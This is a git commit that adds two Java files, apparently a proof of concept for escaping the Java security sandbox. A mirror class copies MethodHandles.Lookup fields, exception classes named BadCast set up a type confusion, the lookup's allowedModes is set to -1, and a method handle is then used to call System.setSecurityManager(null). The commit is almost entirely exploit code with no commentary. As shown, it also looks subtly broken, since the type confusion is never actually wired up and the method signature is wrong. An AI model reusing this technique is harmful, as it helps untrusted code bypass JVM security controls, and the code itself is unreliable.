f781fa2981e5acf7f71bd66a5d0f1f03fdc698eb
KendalYaman <kendal.hakan@icloud.com>
2019-05-06 09:31:36 +0200

    Add files via upload

---
+++ LookupMirror.java
@@ -0,0 +1,9 @@
+
+public class LookupMirror{
+	Class<?> lookupClass;
+	int allowedModes;
+	
+	public void setSecurityNull() {
+		System.setSecurityManager(null);
+	}
+}
---
+++ Main.java
@@ -0,0 +1,30 @@
+import java.lang.invoke.MethodHandle;
+import java.lang.invoke.MethodHandles;
+import java.lang.invoke.MethodType;
+
+public class Main {
+	public static class BadCast1 extends Throwable{
+		Object o1 = MethodHandles.publicLookup();
+	}
+	
+	public static class BadCast2 extends Throwable{
+		LookupMirror lm = new LookupMirror();
+	}
+	
+	public static void throwEx() throws BadCast1{
+		throw new BadCast1();
+	}
+	
+	public static void handleEx(BadCast2 e){
+		e.lm.allowedModes = -1;
+	}
+	
+	public static void main(String[] args) throws Throwable {
+		BadCast2 e = new BadCast2();
+		handleEx(e);
+		MethodType mt = MethodType.methodType(void.class, System.class);
+		MethodHandle mh = MethodHandles.lookup().findStatic(System.class, "setSecurityManager", mt);
+		mh.invokeExact(System.class, null);
+	}
+
+}
